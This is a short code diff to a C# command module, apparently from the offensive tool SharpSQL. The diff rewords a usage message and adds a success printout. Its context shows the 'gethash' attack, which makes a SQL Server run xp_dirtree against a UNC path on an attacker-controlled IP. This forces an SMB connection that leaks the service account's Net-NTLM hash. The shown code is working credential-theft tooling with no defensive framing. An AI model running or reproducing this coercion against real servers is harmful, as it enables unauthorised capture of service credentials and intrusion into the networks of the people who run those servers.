@@ -11,8 +11,8 @@ namespace SharpSQL.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Retrieve Net-NTLM Hash for Service Account");
-            Console.WriteLine("\tUsage: SharpSQL.exe gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP [/sqlauth /user:SQLUSER /password:SQLPASSWORD]");
+            Console.WriteLine("[*] Action: Retrieve the Net-NTLM Hash for the Service Account of the Connected SQL Server:");
+            Console.WriteLine("\tUsage: SharpSQL.exe gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
 
             string user = "";
             string password = "";
@@ -98,7 +98,8 @@ namespace SharpSQL.Commands
             string queryUNC = $"EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";";
             SqlCommand command = new SqlCommand(queryUNC, connection);
             SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
+			Console.WriteLine($"\n[+] Successfully forced SMB Connection on {connectserver} to {ip}!");
+			reader.Close();
 
             connection.Close();
 
